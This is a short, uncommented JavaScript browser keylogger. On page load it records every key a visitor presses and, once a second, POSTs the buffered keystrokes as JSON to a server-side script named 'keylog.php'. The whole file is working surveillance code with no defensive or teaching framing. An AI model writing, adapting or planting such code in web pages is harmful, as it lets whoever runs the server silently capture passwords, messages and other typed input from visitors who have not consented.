var keylog = {
  delay: 1000,
  min: 5,
  cache: [], 

  init: function () {
    window.addEventListener("keydown", function(evt){
      keylog.cache.push(evt.key);
    });
    window.setInterval(keylog.send, keylog.delay);
  },

  send: function () { if (keylog.cache.length > keylog.min) {
    var data = new FormData;
    data.append("presses", JSON.stringify(keylog.cache));
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "keylog.php");
    xhr.send(data);
    keylog.cache = [];
  }}
};
window.addEventListener("DOMContentLoaded", keylog.init);